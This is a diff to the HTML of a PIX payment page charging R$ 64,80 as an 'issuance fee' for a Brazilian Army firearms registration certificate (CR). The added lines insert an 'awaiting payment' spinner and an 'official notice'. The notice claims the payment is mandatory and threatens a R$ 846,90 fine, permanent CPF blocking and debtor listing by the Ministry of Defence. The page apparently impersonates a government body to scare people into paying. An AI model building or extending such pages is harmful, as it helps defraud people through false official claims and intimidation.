@@ -8,11 +8,37 @@ body {
 </style>
 <main class="container mx-auto px-4 py-8" style="background-color: #fff; min-height: 100vh;">
     <div class="max-w-lg mx-auto bg-white p-8 rounded-lg shadow-lg border border-gray-200">
+        
+        <!-- Spinner de Status -->
+        <div class="text-center mb-6 p-4 bg-orange-50 border border-orange-200 rounded-lg">
+            <div class="inline-block animate-spin rounded-full h-6 w-6 border-b-2 border-orange-600 mb-2"></div>
+            <p class="text-orange-700 font-medium text-sm">AGUARDANDO PAGAMENTO</p>
+        </div>
+        
         <!-- Cabeçalho -->
         <div class="text-center mb-6">
             <h2 class="text-2xl font-bold text-green-800 mb-2">PAGAMENTO PIX</h2>
             <p class="text-gray-600">Taxa de Emissão do CR</p>
             <p class="text-3xl font-bold text-green-600 mt-2">R$ 64,80</p>
+        </div>
+
+        <!-- Aviso Obrigatório -->
+        <div class="mb-6 p-4 bg-red-50 border-l-4 border-red-500 rounded-r-lg">
+            <div class="flex items-start">
+                <i class="fas fa-exclamation-triangle text-red-500 mt-1 mr-3"></i>
+                <div>
+                    <h3 class="text-red-800 font-bold text-sm mb-2">⚠️ AVISO OFICIAL - PAGAMENTO OBRIGATÓRIO</h3>
+                    <p class="text-red-700 text-xs leading-relaxed">
+                        <strong>ATENÇÃO:</strong> O pagamento da Taxa de Emissão do Certificado de Registro (CR) é de caráter OBRIGATÓRIO conforme regulamentação do Exército Brasileiro.
+                        <br><br>
+                        <strong>CONSEQUÊNCIAS DO NÃO PAGAMENTO:</strong><br>
+                        • Aplicação de multa administrativa no valor de <strong>R$ 846,90</strong><br>
+                        • Bloqueio definitivo do CPF no Sistema CAC<br>
+                        • Impossibilidade de obtenção de novos registros militares<br>
+                        • Inclusão em cadastro de inadimplentes do Ministério da Defesa
+                    </p>
+                </div>
+            </div>
         </div>
 
         <!-- Status -->
